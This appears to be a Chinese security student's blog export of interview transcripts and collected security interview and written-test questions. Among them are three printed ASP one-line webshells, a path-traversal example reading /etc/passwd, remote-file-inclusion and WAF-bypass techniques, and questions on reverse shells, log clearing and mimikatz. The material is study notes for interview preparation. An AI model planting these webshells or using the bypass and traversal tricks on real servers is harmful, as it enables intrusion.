+<p>面试官: 假如说你没有网络层这样的判断机制, 在系统开发阶段就把这个给过滤掉你应该怎么做<br>我: 这个问题没有研究过<br>面试官: 那你之前挖的漏洞啊这些有没有这些问题, 就你抓包修改一个参数达到一个越权或者遍历这样一个目的的时候有没有想过, 系统的运维人员怎么防范这个操作, 就是从网络层面去做限制吗, 假如说他只是修改了一个参数, 修改了一个合法的参数, 请求到这个链接, 他可能还没有触发到你设置的这个阈值, 你应该怎么办<br>我: 那我在开发阶段, 比如说API要调一个东西那肯定是只能调那几种, 那我开发阶段就直接写好一个白名单, 那个规则就只允许这个API去调那几个参数, 如果遇到非法输入的话我就直接返回一个404的页面. 或者直接返回一个403 forbidden</p>
+<h2 id="13-用户要在前端上传一个图片-然后要对这个图片加密-你会采用一个什么加密算法"><a href="#13-用户要在前端上传一个图片-然后要对这个图片加密-你会采用一个什么加密算法" class="headerlink" title="13. 用户要在前端上传一个图片, 然后要对这个图片加密, 你会采用一个什么加密算法"></a>13. 用户要在前端上传一个图片, 然后要对这个图片加密, 你会采用一个什么加密算法</h2><p>我: 我见过的是有专门的图片加密函数, 会直接破坏掉图片里的所有的特征, 是专门的加密图片的函数, 是最安全的</p>
+<p>面试官: 如果说不用函数, 他函数肯定是封装好了, 那他底层肯定是用了加密算法. 如果让你去选择一种加密算法, 你会使用哪种加密算法<br>我: 我会建议用 hash 吧, 不可逆加密算法<br>面试官: 有个问题, 我上传的图片肯定让后端能看这个图片的, 用hash的话后端没办法去查看这个图片<br>我: 那用RSA算法吧, 公钥加密私钥解密</p>
+<h2 id="14-你一般会看哪一些网络安全论坛或者站点比较多一些"><a href="#14-你一般会看哪一些网络安全论坛或者站点比较多一些" class="headerlink" title="14. 你一般会看哪一些网络安全论坛或者站点比较多一些"></a>14. 你一般会看哪一些网络安全论坛或者站点比较多一些</h2><p>我: 首先其实, 先知社区, Sec-News, 还有像是github上面会有很多, 还有知识星球. 还有twitter上也挺多的.</p>
+<h2 id="15-我这边没有其它问题了-你这边还有什么想问我的吗"><a href="#15-我这边没有其它问题了-你这边还有什么想问我的吗" class="headerlink" title="15. 我这边没有其它问题了, 你这边还有什么想问我的吗"></a>15. 我这边没有其它问题了, 你这边还有什么想问我的吗</h2><p>我: 我想问一下就是, 如果方便的话可以告诉我一下贵公司的安全业务, 就作为业务安全主要是怎么设计的.</p>
+<p>面试官: 这个比较敏感</p>
+<p>我: 平时遇到最多的安全问题是什么, 遇到最多的攻击方式是什么<br>面试官: 我们的场景比较单一, 我们的业务这边可能就只有一个APP, APP上可能分了很多功能, 有什么社区功能, 电商功能, 还有一些直播的, 大概分了几个功能模块, 主要还是一些电商平台的业务逻辑的漏洞, 因为我们经常会搞一些电商活动, 可能会存在一些支付问题, 或者说优惠卷问题, 或者说活动被刷等等, 还有一些黑闪会员这些问题可能是我们面临的比较多一些<br>我: 主要还是逻辑漏洞会多一些<br>面试官: 对, 因为像传统的一些sql, rce都不会在一些稍微有规模的公司里面有, 更多的还是聚焦在业务层</p>
+<p>我: 现在还是java层面的漏洞会多一点吧<br>面试官: 对, 因为我们主要还是java语言, 我们就是app嘛</p>
+<p>我: 会不会遇到一些二进制方面的漏洞<br>面试官: 这个不会, 因为我们对我们包都做了一些加固</p>
+]]></content>
+      <categories>
+        <category>求职</category>
+      </categories>
+      <tags>
+        <tag>记录</tag>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>redis未授权</title>
+    <url>/2021/09/12/redis%E6%9C%AA%E6%8E%88%E6%9D%83/</url>
+    <content><![CDATA[]]></content>
+      <categories>
+        <category>redis</category>
+      </categories>
+      <tags>
+        <tag>反弹shell</tag>
+        <tag>原理分析</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息安全笔试题收集</title>
+    <url>/2021/09/19/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E7%AC%94%E8%AF%95%E9%A2%98%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h2 id="TODO-LIST"><a href="#TODO-LIST" class="headerlink" title="TODO LIST"></a>TODO LIST</h2><ul>
+<li><input checked="" disabled="" type="checkbox"> 渗透测试</li>
+<li><input checked="" disabled="" type="checkbox"> Web安全</li>
+<li><input checked="" disabled="" type="checkbox"> PHP安全</li>
+<li><input checked="" disabled="" type="checkbox"> Java安全</li>
+<li><input checked="" disabled="" type="checkbox"> Linux相关</li>
+<li><input disabled="" type="checkbox"> Windows相关</li>
+<li><input checked="" disabled="" type="checkbox"> 内网渗透</li>
+<li><input checked="" disabled="" type="checkbox"> 安全研发</li>
+<li><input disabled="" type="checkbox"> 甲方安全运营</li>
+</ul>
+<h2 id="Web安全"><a href="#Web安全" class="headerlink" title="Web安全"></a>Web安全</h2><p>SQL注入的防范方法</p>
+<h2 id="Java安全"><a href="#Java安全" class="headerlink" title="Java安全"></a>Java安全</h2><p>JVM内存模型<br>程序计数器，Java栈(虚拟机栈)，本地方法栈，堆，方法区</p>
+<p>asp一句话木马写法</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;%eval request(&quot;lamber&quot;)%&gt;</span><br><span class="line">&lt;%execute request(&quot;lamber&quot;)%&gt;</span><br><span class="line">&lt;script language=vbs runat=server&gt;eval(request(&quot;c&quot;))&lt;/script&gt; </span><br></pre></td></tr></table></figure>
+
+<h2 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h2><p>linux 减少所有用户执行权限的方式</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">chmod -x    test.txt</span><br><span class="line">chmod a-x   test.txt</span><br><span class="line">chmod ugo-x test.txt</span><br></pre></td></tr></table></figure>
+
+<p>linux 查看端口占用情况</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">lsof -i:port</span><br><span class="line">netstat -tunlp | grep port</span><br></pre></td></tr></table></figure>
+
+<p>进程的通信方式<br>管道，命名管道，消息队列，信号量，共享内存</p>
+<p>批量kill掉包含某个关键字(abc)的进程<br>ps -ef | grep abc | grep -v grep | cut -c 9-15 | xargs kill -9</p>
+<p>linux服务器中木马之后，要怎样应急</p>
+<p>bash 反弹 shell</p>
+<h2 id="Windows相关"><a href="#Windows相关" class="headerlink" title="Windows相关"></a>Windows相关</h2><p>后渗透攻击方式以及相关工具<br>拿到linux服务器后进行横向凭据移动<br>如何利用存储型xss获取权限<br>小说app登录58同城账号，收到了58同城的验证码，结果被盗号，这是为何<br>java安全</p>
+<p>基线扫描中 针对k8s环境的相关危险端口和利用方式</p>
+<p>linux查找目录下的所有文件中是否含有某个字符串并指出该字符串所在行数</p>
+<p>win下查询域用户 abc 的账号信息</p>
+<p>查询所有进程服务并列举出来</p>
+<p>win下关闭文件共享的命令</p>
+<p>tcpdump的用法  host port</p>
+<p>kerberos认证协议</p>
+<p>tar解压 tar.gz 并标准输出</p>
+<p>find命令参数</p>
+<p>cookie和session的区别</p>
+<p>SSRF相关的函数</p>
+<p>报错注入函数的原理</p>
+<p>powershell 绕过 windows AMSI</p>
+<p>编写sql查询每个玩家最后一个动作 （编程题）</p>
+<p>grep查询包含关键字的文件</p>
+<p>sqlmap 保存 post数据为txt  并指定扫描参数</p>
+<p>centos 日志文件路径</p>
+<p>linux预加载挂载木马</p>
+<p><code>\&lt;\w&#123;1,10&#125;.*on\w+=</code></p>
+<p>信息安全有哪些方面，你对信息安全越来越重要这件事有什么看法<br>编写程序  读取 txt文件里的json数据  获取最多的 src_ip   并计数 src_ip 访问了目标域名host几次<br>{“src_ip”:”10.10.10.10”;”host”:”58.com”}</p>
+<h2 id="甲方安全运营"><a href="#甲方安全运营" class="headerlink" title="甲方安全运营"></a>甲方安全运营</h2><p>信息安全三要素 (★★★)<br>保密性(Confidentiality)、完整性(Integrity)和可用性(Availability)</p>
+]]></content>
+      <categories>
+        <category>求职</category>
+      </categories>
+      <tags>
+        <tag>记录</tag>
+        <tag>笔试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>信息安全面试题收集</title>
+    <url>/2021/09/13/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8%E9%9D%A2%E8%AF%95%E9%A2%98%E6%94%B6%E9%9B%86/</url>
+    <content><![CDATA[<h2 id="TODO-LIST"><a href="#TODO-LIST" class="headerlink" title="TODO LIST"></a>TODO LIST</h2><ul>
+<li><input checked="" disabled="" type="checkbox"> 渗透测试</li>
+<li><input checked="" disabled="" type="checkbox"> Web安全</li>
+<li><input checked="" disabled="" type="checkbox"> PHP安全</li>
+<li><input checked="" disabled="" type="checkbox"> Java安全</li>
+<li><input checked="" disabled="" type="checkbox"> Linux相关</li>
+<li><input disabled="" type="checkbox"> Windows相关</li>
+<li><input checked="" disabled="" type="checkbox"> 内网渗透</li>
+<li><input checked="" disabled="" type="checkbox"> 安全研发</li>
+<li><input disabled="" type="checkbox"> 甲方安全运营</li>
+</ul>
+<h2 id="渗透测试"><a href="#渗透测试" class="headerlink" title="渗透测试"></a>渗透测试</h2><ul>
+<li>如何绕过CDN找到真实IP，请列举五种方法 (★★★)</li>
+<li>redis未授权访问如何利用，利用的前提条件是? (★★★)</li>
+<li>mysql提权方式有哪些?利用条件是什么? (★)</li>
+<li>windows+mysql，存在sql注入，但是机器无外网权限，可以利用吗? (★)</li>
+<li>常用的信息收集手段有哪些，除去<code>路径扫描</code>，<code>子域名爆破</code>等常见手段，有什么猥琐的方法收集企业信息? (★★)</li>
+<li><code>SRC挖掘</code>与<code>渗透测试</code>的区别是什么，针对这两个不同的目标，实施过程中会有什么区别 (★★)</li>
+<li>存储xss在纯内网的环境中，可以怎么利用？(★★)</li>
+<li>mssql中，假设为sa权限，如何不通过<code>xp_cmdshell</code>执行系统命令 (★★)</li>
+<li>假设某网站存在waf，不考虑正面绕过的前提下，应该如何绕过(分情况讨论 云waf/物理waf) (★)</li>
+</ul>
+<h2 id="Web安全相关"><a href="#Web安全相关" class="headerlink" title="Web安全相关"></a>Web安全相关</h2><ul>
+<li>介绍一下自认为有趣的挖洞经历（或CTF经历）(★★★)</li>
+<li>CSRF的成因及防御措施（不用token如何解决) (★)</li>
+<li>SSRF的成因及防御措施 (★★)</li>
+<li>SSRF如何探测非HTTP协议(★)</li>
+<li>简述一下SSRF的绕过手法(★★)</li>
+<li>简述一下SSRF中DNSRebind的绕过原理及修复方法(★)</li>
+<li>介绍 SQL 注入漏洞成因，如何防范？注入方式有哪些？除了拖取数据库数据，利用方式还有哪些？(★★)</li>
+<li>如何通过sql注入写shell,写shell的前提条件是什么?(★★)</li>
+<li>介绍一下XSS漏洞的种类，dom型XSS和反射XSS的区别是什么?(★★)</li>
+<li>如何防范 XSS 漏洞，在前端如何做，在后端如何做，哪里更好，为什么？(★★)</li>
+<li>讲述一下找回密码可能涉及的逻辑漏洞(★)</li>
+<li>假设你是甲方的一名安全工程师，应该如何降低逻辑漏洞的出现率?(★★)</li>
+<li>oauth认证过程中可能会出现什么问题，导致什么样的漏洞?(★)</li>
+<li>CSP应该如何使用及配置，有哪些绕过CSP的方式(★★)</li>
+<li>已知某网站存在LFI(本地文件包含)，但是无法上传任何文件，针对该情况有哪些利用方式?(★★)</li>
+<li>简述一下XXE漏洞产生的原理，针对PHP和JAVA，XXE分别可以进行哪些恶意利用?(★★)</li>
+</ul>
+<h2 id="PHP安全"><a href="#PHP安全" class="headerlink" title="PHP安全"></a>PHP安全</h2><ul>
+<li>PHP中如何使用<code>phar://</code>伪协议触发反序列化，利用场景以及前提条件有哪些?(★★)</li>
+<li>如何绕过<code>php.ini</code>中<code>disable_function</code>的限制，有哪些方法，其中成功率最高的方法是哪个，为什么?(★★★)</li>
+<li>文件上传中<code>%00</code>截断的原理是什么，官方是如何设计修复方案的?(★★)</li>
+<li>实现一个一句话webshell，绕过RASP的方式有哪些，绕过机器学习检测的方式有哪些，绕过AST-Tree的方式有哪些(★★)</li>
+<li>PHP伪协议的攻击场景有哪些？(★★)</li>
+<li><code>mail</code>函数的攻击面有哪些?(★)</li>
+<li>如何不通过数字以及字符构造webshell，其原理是什么，此类特性还会造成什么安全问题?(★)</li>
+</ul>
+<h2 id="JAVA安全"><a href="#JAVA安全" class="headerlink" title="JAVA安全"></a>JAVA安全</h2><ul>
+<li><code>ClassLoader</code>是什么? 加载自定义<code>ClassLoader</code>的前提是什么? (★)</li>
+<li>大概讲一下<code>CommonCollections1</code>的利用链，该利用链有什么样的限制?  (★★)</li>
+<li>fastjson的反序列化和普通反序列化漏洞的区别是什么? (★★)</li>
+<li>在tomcat中实现内存马有哪些方式，有办法实现重启之后依然不会消失的内存马吗? (★)</li>
+<li>单向代码执行链如何实现执行多条语句，如<code>CommonCollections1</code> (★)</li>
+<li>请简单讲述一下Shiro反序列化漏洞的原理，无法使用ysoerial中common-collections利用链的原因是什么? (★)</li>
+<li>冰蝎当中通过Java联动<code>Cobalt Strike</code>上线的原理是什么? (★)</li>
+</ul>
+<h2 id="安全研发相关"><a href="#安全研发相关" class="headerlink" title="安全研发相关"></a>安全研发相关</h2><ul>
+<li>简要介绍自己常用的扫描器和其实现上的特点(★★)</li>
+<li>如果让你设计一个HIDS，应该如何设计(★)</li>
+<li>介绍一下Python中的迭代器、生成器、装饰器(★)</li>
+<li>介绍自己常用的python库(★)</li>
+<li>讲一讲celery的特点以及原理(★)</li>
+<li>简述Python中的GIL锁，以及如何打破GIL锁的限制(★★)</li>
+<li>masscan号称世界上最快的扫描器，快的原因是什么，如何实现一个自己的masscan?(★★)</li>
+<li>简述协程，线程，以及进程的区别(★★)</li>
+</ul>
+<h2 id="Linux相关"><a href="#Linux相关" class="headerlink" title="Linux相关"></a>Linux相关</h2><ul>
+<li>简述一下守护进程的概念，如何生成一个守护进程? (★)</li>
+<li>Linux 服务器的安全运维操作有哪些？如何保护 SSH？(★★)</li>
+<li>入侵 Linux 服务器后需要清除哪些日志？(★★)</li>
+<li>反弹 shell 的常用命令？一般常反弹哪一种 shell？为什么？(★★★)</li>
+<li>从主机的层面，反弹shell如何监控 (★★★)</li>
+<li>Rootkit的种类有哪些，针对不同种类的Rootkit应该如何防护以及检测 (★★)</li>
+<li>A账户创建了权限为766的文件夹<code>adir</code>，该文件夹中有B账户的文件<code>password.txt</code>，权限为B账户的700，请问B账户能否读取到<code>adir/password.txt</code>文件的内容 (★)</li>
+<li>ssh软链接后门的原理是什么，可以通过该原理构造其他后门吗?(★)</li>
+<li>Linux中fork的原理是什么，子进程一定会拷贝父进程的资源状态吗？(★★)</li>
+<li>实现R3层HOOK的方式有哪些，R0层的HOOK又有哪些? (★)</li>
+<li>Linux下如何准确实现应用识别，如识别<code>nginx</code> <code>mysql</code>等  (★)</li>
+<li>假设某Linux机器存在命令审计(方法未知)，有哪些可能的绕过方法? (★★)</li>
+<li>Linux常见的提权方法有哪些?(★★)</li>
+<li>僵尸进程和孤儿进程的区别是什么? (★)</li>
+</ul>
+<h2 id="内网渗透"><a href="#内网渗透" class="headerlink" title="内网渗透"></a>内网渗透</h2><ul>
+<li>psexec的底层实现原理是什么? (★)</li>
+<li>SSP接口中修复了哪个模块杜绝了mimikatz的恶意利用，具体是如何修复的？(★★)</li>
+<li>内网KDC服务器开放在哪个端口，针对kerbores的攻击有哪些? (★★★)</li>
+<li>在win10或者winserver2012中，如果需要使用mimikatz，该如何使用，修改注册表后如何在不重启机器的情况下获取NTLM? (★★)</li>
+<li>域内如何查询员工对应的机器? (★)</li>
+<li>如何查询域之间的信任关系? (★)</li>
+<li>域控开放的常见端口有哪些?(★)</li>
+<li>windows内网中ntlm协议认证过程 (★★★)</li>
+<li>cobalt strike中上线方式有哪些，各自是什么原理，如果需要绕过监控，如何绕? (★★)</li>
+<li>横向渗透中，wmic如何构造有回显的命令执行? (★★)</li>
+<li>windows应急响应中，需要查看哪些安全日志ID，分别对应哪些攻防场景，如果该windows主机为域控，又应该查看哪些事件日志? (★★★)</li>
+<li>golden ticket和sliver ticket的区别是什么? (★★★)</li>
+<li>sliver ticket利用的前置条件是什么?(★)</li>
+<li>在非域主机的情况下，如何快速发现域主机？ (★★)</li>
+<li>mimikatz的原理，哪个补丁导致了mimikatz无法利用，如何绕过? (★★)</li>
+<li>有没有办法在不重启机器的前提下启用wdigest这个SSPI? (★)</li>
+<li>NTLM relay的攻击场景有哪些，使用NTLM relay会受到哪些限制? (★)</li>
+<li>windows中如何鉴别用户身份? SID是什么? 基于SID的SID History攻击原理是什么? (★)</li>
+<li>假设拿到了某台域机器的权限，但是机器上并没有域账户，应该如何进行域渗透? (★★)</li>
+<li>域的初始化配置允许任何域用户登录任意加了域的机器，这是为什么? (★)</li>
+<li>如何查询域管登录过的机器，查询原理又是什么? (★)</li>
+</ul>
+<h2 id="其他安全相关"><a href="#其他安全相关" class="headerlink" title="其他安全相关"></a>其他安全相关</h2><ul>
+<li>RSA加解密流程(★)</li>
+<li>HTTPS是如何实现的(★★)</li>
+<li>如何防护运营商的DNS劫持/链路劫持(★★)</li>
+<li>如何防范羊毛党?(★)</li>
+<li>一个大范围影响的0day被曝光，作为甲方安全工程师，应该如何处理(★★)</li>
+</ul>
+]]></content>
+      <categories>
+        <category>求职</category>
+      </categories>
+      <tags>
+        <tag>记录</tag>
+        <tag>面试</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>基础算法题</title>
+    <url>/2021/09/04/%E5%9F%BA%E7%A1%80%E7%AE%97%E6%B3%95%E9%A2%98/</url>
+    <content><![CDATA[<p>输入:<br>1,2,2,4</p>
+<p>输出:<br>2,3</p>
+<p>一群人排成一排，找其年龄的最长连续长度<br>输入:<br>21,40,41,22,23,24</p>
+<p>输出:<br>4</p>
+<p>对于给定的 str1 和 str2 识别其最长子序列长度<br>输入:<br>abcde cdefg</p>
+<p>输出:<br>3</p>
+]]></content>
+      <categories>
+        <category>求职</category>
+      </categories>
+      <tags>
+        <tag>记录</tag>
+        <tag>算法</tag>
+        <tag>编程</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>微步在线一面总结</title>
+    <url>/2021/10/18/%E5%BE%AE%E6%AD%A5%E5%9C%A8%E7%BA%BF%E4%B8%80%E9%9D%A2%E6%80%BB%E7%BB%93/</url>
+    <content><![CDATA[<h2 id="1-你先介绍一下你自己吧"><a href="#1-你先介绍一下你自己吧" class="headerlink" title="1. 你先介绍一下你自己吧"></a>1. 你先介绍一下你自己吧</h2><p>我: 我是来自成都信息工程大学目前是大四, 学的专业是信息安全专业. 主要研究方向是web安全, 然后在大一大二的时候参加过一些CTF比赛, 有过一定的实战挖掘经历, 在edu-src产出过两枚漏洞, 然后在先知社区上面发表过一两篇文章, 这是我在校的一些经历. </p>
+<h2 id="2-毕业之前会找个实习还是做毕设"><a href="#2-毕业之前会找个实习还是做毕设" class="headerlink" title="2. 毕业之前会找个实习还是做毕设"></a>2. 毕业之前会找个实习还是做毕设</h2><p>我: 如果毕设那边有空的话, 我挺想到贵公司去实习的</p>
+<h2 id="3-你为什么想来这呢"><a href="#3-你为什么想来这呢" class="headerlink" title="3. 你为什么想来这呢"></a>3. 你为什么想来这呢</h2><p>我: 因为发展前景比较好, 一个上升期的公司, 技术氛围也比较好, 可以学到更多东西. </p>
+<h2 id="4-Nmap-sS-和-Nmap-sT-有什么区别"><a href="#4-Nmap-sS-和-Nmap-sT-有什么区别" class="headerlink" title="4. Nmap -sS 和 Nmap -sT 有什么区别"></a>4. Nmap -sS 和 Nmap -sT 有什么区别</h2><p>我: -sS是用SYN扫描, -sT的话是TCP扫描</p>
+<p>面试官: TCP扫描?<br>我: 就TCP ping的方式<br>面试官: ping的方式? 第一个叫SYN, 第二个叫ICMP扫描对吧<br>我: 嗯</p>
+<h2 id="5-你讲一下文件包含是什么意思-把我当什么都不懂的人然后来表达一下"><a href="#5-你讲一下文件包含是什么意思-把我当什么都不懂的人然后来表达一下" class="headerlink" title="5. 你讲一下文件包含是什么意思, 把我当什么都不懂的人然后来表达一下"></a>5. 你讲一下文件包含是什么意思, 把我当什么都不懂的人然后来表达一下</h2><p>我: 文件包含是一个web层面漏洞, 假如说你在访问一个网站的时候, 你的链接上面会有一个参数后面可能会接一个文件地址, 比如说像你在进行查看一个文件页面的时候, 可能会看到一个 file.php 这时候这个页面会给你返回一个file文件的信息, 然后如果你把这个 file.php 改成其他文件名, 如果他返回了其他文件的内容信息的话就说明, 这个页面他存在一个文件包含的漏洞. 通过这个漏洞你可以去查看到一些, 你本来访问不到的东西, 比如说你要去访问他本机上的 <code>etc/passwd</code> 他的一个密码的一个文件, 那么你可以在 url 链接后面改成 <code>../../../etc/passwd</code> 用目录穿越去读取这个本来不应该在web界面出现的文件, 同时如果他网站上面开启了, 允许远程文件包含, 那么这时候, 你可以把文件名改成另一个的链接地址, 比如说你自己的一个服务器, 就是你自己搭建的一个网站, 然后在你的服务器下面有一个 shell.php 那么在开启远程文件包含的情况下, 你可以去访问自己服务器的, shell.php 这样你就可以实现一个远程的文件包含, 因为他包含的是你自己服务器上的一个文件</p>
+<p>面试官: 文件包含这个漏洞的产生的原因是什么<br>我: 产生的原因是他启用了文件包含的函数, 但是他没有做验证, 然后他使用了 include, require等函数但是他没有对用户的输入做验证, 也没有对该文件能够访问的其他文件其他目录做权限的一个维持, 这样的话你可以通过他的输入点, 通过这个include函数去访问他的文件</p>
+<p>面试官: 那如果你为了消除这个漏洞你会怎么做<br>我: 首先是把这个文件所在的目录权限控制好, 就不允许他去读取其他目录的文件, 只允许在当前目录下进行一个文件的访问. 对用户的输入进行验证, 避免用户输入目录穿越之类的特殊字符</p>
+<h2 id="6-讲讲三个扫描器-AWVS-Nessus-X-Ray这些扫描器都有什么区别"><a href="#6-讲讲三个扫描器-AWVS-Nessus-X-Ray这些扫描器都有什么区别" class="headerlink" title="6. 讲讲三个扫描器 AWVS, Nessus, X-Ray这些扫描器都有什么区别"></a>6. 讲讲三个扫描器 AWVS, Nessus, X-Ray这些扫描器都有什么区别</h2><p>我: AWVS主要是主动性的web层面的扫描器, 是去扫描网站上的漏洞的, 利用他自身的漏洞库对网站进行的验证, 还有他自身的exp, poc对网站指纹进行识别之后去进行一个漏洞的验证. 而Nessus的话主要是对服务器端的扫描器, 主要扫描的是内网环境下各服务器, 有没有服务器上的内网之中的一些漏洞, 而X-Ray的话是被动扫描器, 他通过你访问网站, 他监听你访问网站的流量对监听到的流量进行扫描处理, 来进行漏洞的验证</p>
+<p>面试官: 再讲一遍被动的监听然后是什么<br>我: X-Ray的话他相当于是这样, 他自己在本地额外开一个监听端口, 用于监听访问浏览器, 访问漏洞网站的流量. 他监听到这部分流量之后, 他会进行一个流量的一些扫描. 而不像是AWVS, AWVS是你给他一个IP地址他主动去对这个网站去进行一个扫描</p>
+<p>面试官: 就是说AWVS你给一个网段对吧<br>我: 对, 然后X-Ray的话是你正常浏览网页, 他会被动的把你浏览的这些流量去扫描<br>面试官: 他会听到一些资产对吗<br>我: 对, 他会listen到一些资产, 然后他这样的话扫描精度会比AWVS这种主动扫描器高一些<br>面试官: 就是他可能没有AWVS扫的那么全, 如果没人的访问的话</p>
+<h2 id="7-Java的洞了解吗"><a href="#7-Java的洞了解吗" class="headerlink" title="7. Java的洞了解吗"></a>7. Java的洞了解吗</h2><p>我: 不怎么了解, 最近在学Java漏洞这一块儿, 还没有入门</p>
+<h2 id="8-那内存马了解吗"><a href="#8-那内存马了解吗" class="headerlink" title="8. 那内存马了解吗"></a>8. 那内存马了解吗</h2><p>我: 这个也不是很了解, 只听过这个专业名词但没有了解过</p>
+<h2 id="9-那讲一个XXE吧"><a href="#9-那讲一个XXE吧" class="headerlink" title="9. 那讲一个XXE吧"></a>9. 那讲一个XXE吧</h2><p>我: XXE这个是, XML文件有一个外部实体化的一个功能. 这个功能可以利用XML文件去进行一个外部实体化的一个注入, 通常来说利用这个漏洞可以做到文件读取, 去读取服务器下的任意文件, 然后在php里面开启了特定设置之后可以利用XXE这个漏洞去做命令执行.</p>
+<p>面试官: 两个危害, 一个文件读取, 一个命令执行. 第二个需要开一些配置, 对吧<br>我: 对, 然后还可以做端口探测, 去探测内网开放了哪些端口. </p>
+<p>面试官: 那他这个XXE这个漏洞是为什么会产生呢.<br>我: 因为他的XML文件, 有一个DTD模块可以允许调用外部的一些资源, 然后你通过外部的资源, 比如你调用一个远程的文件读取, 就可以读取到你服务器的一些… </p>
+<h2 id="10-那在问一些编码和绕过相关的东西-有了解吗"><a href="#10-那在问一些编码和绕过相关的东西-有了解吗" class="headerlink" title="10. 那在问一些编码和绕过相关的东西, 有了解吗"></a>10. 那在问一些编码和绕过相关的东西, 有了解吗</h2><p>我: 有了解过一些. 通常来说编码这个知识点, 这个措施, 用于在漏洞的防护方面, 比如像XSS的html实体化转移编码, 还有SQL注入的对特殊字符进行编码绕过. 编码这个东西一方面是后端对用户输入进行一个编码的过滤, 还有一个针对开发者对你进行的一些过滤措施, 比如像过滤了空格, 过滤了一些特殊字符之后, 你可以用编码来进行绕过. 就编码这个措施无论作为攻击还是防守, 都是可以经常使用到的</p>
+<h2 id="11-那一般常见的绕WAF的方法"><a href="#11-那一般常见的绕WAF的方法" class="headerlink" title="11. 那一般常见的绕WAF的方法"></a>11. 那一般常见的绕WAF的方法</h2><p>我: 最老式的就是编码绕过, 然后还有就是可以用脏字符去把输入数据堆积的特别大, 然后WAF通常就识别不到你后面的危害字符, 比如说前面堆积几千上万个字符, 后面再接你真正的payload, 这时候有些WAF就会检测不到后面的真正payload. 然后的话就是利用一些特殊的一些语法吧, 比如说mysql里面把空格过滤了的话, 可以用注释符号去绕过空格, 或者用 <code>$&#123;IFS&#125;</code> 来代替空格, 也可以起到一个绕过空格的作用, 或者是PHP里面他如果过滤了关键函数, 他可以用其他的函数, 比如说 <code>chr()</code> 函数做一个编码拼接出你需要的函数, 也可以用点号之类的来拼接一个有危害的函数, 也是一些来针对不同的环境来测试的方法.</p>
+<p>面试官: 行, 挺好的. 那你学绕过WAF这块是怎么学的<br>我: 我绕过WAF这块, 我之前绕过的WAF就是安全狗, 之前做过一个安全狗的一个绕过. 当时绕的时候首先是直接FUZZ, 先FUZZ他过滤了哪些敏感字符, 然后再用他没有过滤掉的部分去进行利用去进行组合, 就在他黑名单没过滤掉的那部分去挑那些字符去进行一些组合, 然后就是用脏字符去堆积一个很长的payload也可以进行一个绕过, 因为脏字符来说的话, 是最万能的一个绕过方式吧, 现在大部分的WAF都是匹配到一定数据量之后就不会再往后面匹配了<br>面试官: 性能考虑对吧<br>我: 对性能考虑</p>
+<p>面试官: 那你为什么想要绕WAF呢, 是CTF还是什么活动<br>我: CTF还是比较多吧, 大部分CTF都是给一个模拟的WAF环境, 就是给你过滤特别多的东西, 让你在有限的一些函数, 一些功能里面去把它过滤的那个部分给绕过过去. 其实现在大部分CTF题都是基于这个思路来出题的</p>
+<h2 id="12-关于-linux-操作系统-和-windows-操作系统"><a href="#12-关于-linux-操作系统-和-windows-操作系统" class="headerlink" title="12. 关于 linux 操作系统, 和 windows 操作系统"></a>12. 关于 linux 操作系统, 和 windows 操作系统</h2><p>我: 这个了解的就比较少了</p>
+<p>面试官: 那都了解啥呀<br>我: linux的话就是基本的操作就没啥问题, 然后windows这边做过一些域环境的实验吧</p>
+<p>面试官: 讲两个windows下的认证协议<br>我: Kerberos认证协议的话是, 首先是有两个票据, 有一个白银票据有一个黄金票据. Kerberos认证协议他会给票据分发认证信息, 用户拿着这个认证信息之后, 再去服务端进行一个验证. 具体流程我现在讲不太清楚, 就有点忘了. 但是他就是一个用户的身份的认证流程吧</p>
+<p>面试官: 那你再说一个, 另外一个认证的名字<br>我: 另外一个认证的名字…没有了解过, 我只知道一个Kerberos的认证协议</p>
+<p>面试官: NTLM了解吗<br>我: 噢, 听说过这个, 但是没有去学习过. 这个也是认证协议的一种吗<br>面试官: 对<br>我: 就之前我听说这个协议的时候一直以为是windows下面的一个漏洞来着<br>面试官: Kerberos其实是windows AD域下的认证, 然后你没有开AD域的时候, 在工作组的时候, 只要你远程输入密码, 你其实都用的NTLM.<br>我: 就是在没有域环境的情况下都是用的NTLM?<br>面试官: 对, 没有域环境的情况下你输入的密码, 比如说你登录一个SMB服务器, 这其实就是一个NTLM. NTLM因为他就是一个关于密码和hash的东西嘛.</p>
+<p>面试官: 搭过共享的SMB服务吗<br>我: 是那个共享文件系统吗<br>面试官: 对<br>我: 搭过, 在windows 8下面好像是, 但是IP没有配对, 所以最后我搭建失败了, 只搭到了一半, 要更新SMB服务的时候更新失败了<br>面试官: 在linux下面搭过SMB服务吗<br>我: 没有, linux下面没有弄过这些</p>
+<p>面试官: 知道什么是 Samba 吗<br>我: 不知道<br>面试官: Samba 就是 SMB 在 linux 下的一个实现, 然后在windows下搭SMB其实特别简单. 其实就是你对一个文件夹点属性, 点击共享他就是一个SMB的共享<br>我: 当时搭的时候搭的还挺麻烦的, 从域环境那个地方去开一个文件共享<br>面试官: 就是你要发布到域上对吗<br>我: 对</p>
+<h2 id="13-然后你在edu-src上有几个漏洞来着"><a href="#13-然后你在edu-src上有几个漏洞来着" class="headerlink" title="13. 然后你在edu-src上有几个漏洞来着"></a>13. 然后你在edu-src上有几个漏洞来着</h2><p>我: 有两个</p>
+<p>面试官: 其中有一个是发到先知社区上, 是改了验证手机号<br>我: 对, 然后任意用户密码修改<br>面试官: 然后你另一个洞是什么<br>我: 是一个存储型的XSS, 可以直接打到他的发布项目那个地方, 项目审核的时候会触发他那个存储型的XSS.<br>面试官: 噢, 好像都写了对吗, 都写上去了.</p>
